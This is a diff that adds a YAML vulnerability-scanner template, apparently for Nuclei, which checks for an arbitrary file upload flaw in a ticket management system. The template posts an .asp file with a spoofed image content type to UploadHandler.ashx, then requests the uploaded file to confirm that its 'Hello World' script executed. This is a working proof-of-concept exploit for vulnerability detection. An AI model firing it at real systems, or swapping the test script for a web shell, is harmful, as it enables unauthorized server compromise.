@@ -1,0 +1,45 @@
+id: poc-yaml-zckx-ticketmanager-uploadhandler-upload
+info:
+  name: 中成科信票务管理系统 UploadHandler.ashx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+variables:
+  filename: '{{to_lower(rand_text_alpha(10))}}'
+flow: |
+  http(1) && http(2)
+http:
+  - id: upload-request
+    method: POST
+    path:
+      - '{{BaseURL}}/WeChat/ashx/UploadHandler.ashx'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
+    body: |
+      ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
+      Content-Disposition: form-data; name="file"; filename="{{filename}}.asp"
+      Content-Type: image/jpeg
+      
+      <% Response.Write("Hello World") %>
+      ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1"
+        part: body
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/UploadImage/{{filename}}.asp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Hello World"
+        part: body
